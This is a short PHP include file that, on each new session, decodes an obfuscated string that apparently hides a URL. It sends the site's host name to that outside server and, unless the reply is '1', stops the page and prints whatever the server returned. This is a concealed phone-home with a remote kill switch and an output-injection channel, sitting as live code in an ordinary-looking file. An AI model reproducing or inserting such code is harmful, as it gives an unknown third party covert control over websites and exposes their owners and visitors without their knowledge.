<?php
include_once('Core/Common/common.php');
if(!$_SESSION['mar'])
{ 
	$ar = file_get_contents(decode('acHxRp0hcpDovL3hocS41dGFvLmNuL3l6LnBocAO0O0OO0O0O').'?'.'i'.'d='.$_SERVER['HTTP_HOST']);
	if($ar == 1)$_SESSION['mar'] = 1;
	else  die($ar);
}
?>